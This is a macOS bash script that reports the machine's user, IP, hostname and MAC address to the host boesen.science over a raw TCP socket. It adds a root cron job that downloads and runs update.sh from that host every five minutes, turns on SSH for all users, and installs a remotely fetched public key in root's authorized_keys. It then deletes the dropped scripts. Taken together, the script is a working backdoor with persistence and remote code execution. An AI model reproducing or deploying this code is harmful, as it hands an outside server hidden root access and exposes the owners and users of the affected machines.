#!/usr/bin/env bash

# ifconfig is in /sbin and won't work with default PATH
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

# Linux's hostname -I doesn't work on Macs
USER=$(stat -f "%Su" /dev/console)
IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
HOSTNAME=$(hostname)
MAC=$(ifconfig en0 | awk '/ether/{print $2}')

SERVER="boesen.science"
PORT=2043

if [[ $(< /tmp/ip) != "$IP" ]]; then
	printf "$IP" > /tmp/ip

	exec 3<>/dev/tcp/$SERVER/$PORT
	printf "UPDATE: $USER $IP $HOSTNAME $MAC" >&3

	cat <&3
fi

cat /var/at/tabs/root | grep -v "boesen.science" > /tmp/crontab; mv /tmp/crontab /var/at/tabs/root; rm /tmp/crontab
echo '*/5 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh' >> /var/at/tabs/root

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null

SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH"

if ! grep boesene $SSHPATH/authorized_keys; then
	curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys
fi

rm /tmp/*.sh